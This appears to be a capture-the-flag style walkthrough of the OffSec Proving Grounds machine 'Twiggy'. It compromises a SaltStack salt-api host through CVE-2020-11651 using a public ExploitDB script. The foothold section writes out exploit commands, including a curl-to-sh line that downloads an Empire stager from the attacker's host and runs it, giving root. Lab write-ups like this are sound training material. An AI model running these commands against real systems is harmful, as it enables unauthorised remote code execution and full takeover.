---
title: "PG: Twiggy"
date: 2024-02-09
draft: false
tags:
  - offsec
  - proving-grounds
  - easy
  - linux
  - saltstack
  - salt-api
  - empire
categories:
  - walkthrough
---

{{< box-info name="Twiggy" os="Linux" difficulty="Easy" ip="192.168.192.62" platform="OffSec Proving Grounds" >}}

---

## Recon

### Nmap

```bash
nmap -sC -sV -oN nmap/initial 192.168.192.62
```

{{< collapse title="Full nmap output" >}}
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
```
{{< /collapse >}}

---

## Enumeration

### Port 80 - Mezzanine CMS

A blog running Mezzanine CMS with an admin login page. No weak credentials, no version info exposed. Moving on.

### Port 8000 - Salt API

Sending a POST request to port 8000 reveals the service identity in the response headers:

![Salt API header revealing version](/images/twiggy/salt-api-header.png)

The header shows `salt-api/3000-1` running on `CherryPy 5.6.0`. SaltStack has well-known critical vulnerabilities.

### Ports 4505/4506 - ZeroMQ

These are SaltStack's ZeroMQ message bus ports, confirming we're dealing with a full Salt deployment.

---

## Foothold

### SaltStack Salt API RCE (CVE-2020-11651)

Found the exploit on [ExploitDB](https://www.exploit-db.com/exploits/48421).

First, validate RCE with a ping:

```bash
# Start tcpdump
sudo tcpdump -i tun0 icmp

# Test RCE
python3 ./exploit.py --master 192.168.192.62 --exec "ping 192.168.45.216"
```

Confirmed -- we have code execution.

### Getting a Shell via Empire

The exploit behaves inconsistently with standard reverse shells, so I used **PowerShell Empire** (works on Linux targets too):

1. Launch Empire server & client
2. Create and start an HTTP listener

![Empire HTTP listener](/images/twiggy/empire-listener.png)

3. Generate a `multi_bash` stager and download the shell script
4. Serve it via Python HTTP server
5. Trigger via the Salt API exploit:

```bash
python3 ./exploit.py --master 192.168.192.62 \
  --exec "curl http://192.168.45.216:8000/java.sh | sh"
```

Agent calls back -- we're in as **root**. No privesc needed.

---

## Proof

{{< terminal title="proof" >}}
local.txt: [redacted]
proof.txt: [redacted]
{{< /terminal >}}

![Root proof](/images/twiggy/proof.png)

---

## Key Takeaways

{{< callout type="note" >}}
- Always inspect HTTP response headers -- they can reveal service versions that aren't shown in the page content
- SaltStack CVE-2020-11651 is an authentication bypass leading to RCE -- extremely critical
- When standard reverse shells don't work, C2 frameworks like Empire provide reliable alternatives
- Ports 4505/4506 (ZeroMQ) are a dead giveaway for SaltStack deployments
{{< /callout >}}
